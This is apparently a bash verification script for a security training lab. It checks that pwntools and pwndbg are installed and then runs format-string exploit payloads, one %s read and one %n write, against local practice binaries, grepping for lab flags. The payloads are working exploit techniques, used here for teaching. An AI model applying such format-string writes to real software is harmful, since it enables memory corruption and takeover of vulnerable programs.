#!/usr/bin/env bash
set -euo pipefail

python2.7 --version
python3 -c 'import pwnlib; print("pwntools", pwnlib.__version__)'
gdb --version | sed -n '1p'
pwndbg -q -batch -ex 'pi import pwndbg; print("pwndbg", pwndbg.__file__)'

cd /home/exp/ksj-labs/day1/01-fsb-read
python2.7 -c 'print "\x60\xc0\x04\x08, %x, %x, %x, %s"' | ./fsb32_read > /tmp/fsb-read.out
grep -a 'KSJ{FSB_READ_VERIFIED}' /tmp/fsb-read.out

cd /home/exp/ksj-labs/day1/02-fsb-write
(python2.7 -c 'print "AAAA"+",%p"*10'; cat) | ./fsb32_write > /tmp/fsb-probe.out
grep -a '0x41414141' /tmp/fsb-probe.out

(python2.7 -c 'print "\x28\xc0\x04\x08%323c%7$n"'; cat) | ./fsb32_write > /tmp/fsb-write.out
grep -a 'changeMe=327' /tmp/fsb-write.out
grep -a 'KSJ{FSB_PERCENT_N_WRITE_VERIFIED}' /tmp/fsb-write.out

test ! -e /tmp/Python-2.7.18
test ! -e /tmp/Python-2.7.18.tgz
echo 'FSB_PPT_COMMANDS=PASS'
